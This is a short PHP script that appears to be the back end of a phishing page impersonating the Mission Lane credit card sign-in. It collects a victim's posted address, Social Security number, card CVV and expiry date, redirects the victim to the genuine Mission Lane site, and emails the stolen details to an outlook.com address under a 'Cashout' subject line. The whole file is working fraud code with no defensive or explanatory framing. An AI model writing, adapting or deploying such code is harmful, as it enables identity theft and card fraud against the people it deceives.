<?php
header('Location: https://dashboard.missionlane.com/signin');
$address=$_POST['address'];
$ssn=$_POST['ssn'];
$cvv=$_POST['cvv'];
$exp=$_POST['exp'];
$nl="\r\n";
$from = "Cashout";
$to = "nwaforalex158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'ADDRESS: ' . $address . $nl.'SSN: ' . $ssn .$nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $exp ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>
